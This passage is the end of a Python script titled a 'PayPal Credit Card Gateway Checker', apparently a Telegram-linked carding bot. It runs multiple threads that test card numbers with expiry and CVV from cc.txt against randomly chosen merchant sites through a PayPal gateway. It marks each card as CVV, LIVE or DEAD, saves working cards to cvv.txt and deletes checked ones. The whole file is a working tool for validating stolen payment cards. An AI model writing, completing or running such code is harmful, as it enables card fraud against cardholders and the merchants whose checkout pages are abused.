𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""

            result['response_text'] = response_text

        return result
    
    def _error_result(self, message: str) -> Dict[str, any]:
        """Create error result"""
        return {
            'cc': self.cc_data,
            'site': self.hostname,
            'status': 'ERROR',
            'message': message,
            'bin_info': BinChecker.check(self.cc6, self.ua)
        }


class WorkerThread(threading.Thread):
    """Worker thread for processing cards"""
    
    def __init__(self, thread_id: int, cc_list: List[str], site_list: List[str], total_cards: int, start_index: int, proxy: Optional[str] = None):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.cc_list = cc_list
        self.site_list = site_list
        self.proxy = proxy
        self.total_cards = total_cards
        self.start_index = start_index
        self.current_index = 0
    
    def run(self):
        """Run the worker thread"""
        print(f"[Bot {self.thread_id}] Started")
        
        for cc_data in self.cc_list:
            self.current_index += 1
            card_number = self.start_index + self.current_index
            
            # Pick random site
            site = random.choice(self.site_list)
            
            # Check card
            checker = CardChecker(cc_data, site, self.proxy)
            result = checker.check()
            
            # Print result
            self._print_result(result, card_number)
            
            # Save CVV card if valid
            if result['status'] == 'CVV':
                save_cvv_card(cc_data)
            
            # Remove card from cc.txt after checking
            remove_card_from_file(cc_data)
            
            # Small delay
            time.sleep(1)
        
        print(f"[Bot {self.thread_id}] Finished")
    
    def _print_result(self, result: Dict[str, any], card_number: int):
        """Print result"""
        status = result['status']
        cc = result['cc']
        site = result['site']
        message = result['message']
        price = result.get('price', '$1.00')
        bin_info = result['bin_info']
        
        if status == 'CVV':
            color = '\033[92m'  # Green
            print(f"{color}CVV {cc} AMOUNT:{price} {message}\033[0m")
        elif status == 'CCN':
            color = '\033[93m'  # Yellow
            print(f"{color}LIVE {cc} AMOUNT:{price} {message}\033[0m")
        else:
            color = '\033[91m'  # Red
            print(f"{color}DEAD {cc} {message}\033[0m")


def load_file(filename: str) -> List[str]:
    """Load lines from file"""
    try:
        with open(filename, 'r') as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except FileNotFoundError:
        print(f"Error: {filename} not found")
        return []


def remove_duplicates(cards: List[str]) -> List[str]:
    """Remove duplicate cards while preserving order"""
    seen = set()
    unique_cards = []
    for card in cards:
        if card not in seen:
            seen.add(card)
            unique_cards.append(card)
    return unique_cards


def remove_card_from_file(cc_data: str):
    """Remove a card from cc.txt file"""
    with file_lock:
        try:
            # Read all cards
            with open('cc.txt', 'r') as f:
                cards = [line.strip() for line in f]
            
            # Remove the checked card
            cards = [card for card in cards if card != cc_data]
            
            # Write back
            with open('cc.txt', 'w') as f:
                for card in cards:
                    if card:  # Skip empty lines
                        f.write(card + '\n')
        except Exception as e:
            print(f"Error removing card from file: {e}")


def save_cvv_card(cc_data: str):
    """Save CVV-valid card to cvv.txt"""
    with file_lock:
        try:
            with open('cvv.txt', 'a') as f:
                f.write(cc_data + '\n')
        except Exception as e:
            print(f"Error saving CVV card: {e}")


def get_bot_count() -> int:
    """Get number of bots from user input"""
    while True:
        try:
            user_input = input("How many bots? (default: 1): ").strip()
            if not user_input:
                return 1
            
            num_bots = int(user_input)
            if num_bots <= 0:
                print("Error: Number of bots must be positive")
                continue
            
            if num_bots > 5:
                print(f"⚠️  WARNING: Using {num_bots} bots may cause high load and potential issues!")
            
            return num_bots
        except ValueError:
            print("Error: Please enter a valid number")
        except KeyboardInterrupt:
            print("\nExiting...")
            exit(0)


def main():
    """Main function"""
    print("=" * 60)
    print("PayPal Credit Card Gateway Checker - Python Version")
    print("=" * 60)
    
    # Get number of bots from user
    Config.NUM_BOTS = get_bot_count()
    
    # Load sites and cards
    sites = load_file('sites.txt')
    cards = load_file('cc.txt')
    
    if not sites:
        print("Error: No sites found in sites.txt")
        return
    
    if not cards:
        print("Error: No cards found in cc.txt")
        return
    
    # Remove duplicates
    original_count = len(cards)
    cards = remove_duplicates(cards)
    duplicates_removed = original_count - len(cards)
    
    if duplicates_removed > 0:
        print(f"Removed {duplicates_removed} duplicate card(s)")
    
    print(f"Loaded {len(sites)} sites and {len(cards)} cards")
    print(f"Starting {Config.NUM_BOTS} bots...\n")
    
    total_cards = len(cards)
    
    # Split cards among bots
    cards_per_bot = len(cards) // Config.NUM_BOTS
    threads = []
    
    for i in range(Config.NUM_BOTS):
        start_idx = i * cards_per_bot
        if i == Config.NUM_BOTS - 1:
            # Last bot gets remaining cards
            bot_cards = cards[start_idx:]
        else:
            bot_cards = cards[start_idx:start_idx + cards_per_bot]
        
        thread = WorkerThread(i + 1, bot_cards, sites, total_cards, start_idx)
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    print("\n" + "=" * 60)
    print("All bots finished!")
    print("=" * 60)


def check_ppcp_card(card_details, site_urls):
    """
    Wrapper function to check a single card using PPCP gateway.

    Args:
        card_details (str): Card in format 'number|mm|yy|cvv'
        site_urls (list): List of site URLs to attempt checking on

    Returns:
        str: Formatted response result
    """
    import random

    # Pick a random site from the provided list
    if site_urls:
        site_url = random.choice(site_urls)
    else:
        # Load sites from sites.txt file
        if os.path.exists('ppcp/sites.txt'):
            with open('ppcp/sites.txt', 'r') as f:
                sites = [line.strip() for line in f if line.strip()]
        else:
            # Load from the project root if ppcp folder is not present in the path
            if os.path.exists('sites.txt'):
                with open('sites.txt', 'r') as f:
                    sites = [line.strip() for line in f if line.strip()]
            else:
                return "❌ No sites found!"

        if sites:
            site_url = random.choice(sites)
        else:
            return "❌ No sites found!"

    # Check the card
    checker = CardChecker(card_details, site_url)
    result = checker.check()

    # Return the formatted response
    return result.get('response_text', f"ERROR: {result.get('message', 'Unknown error')}")


if __name__ == "__main__":
    main()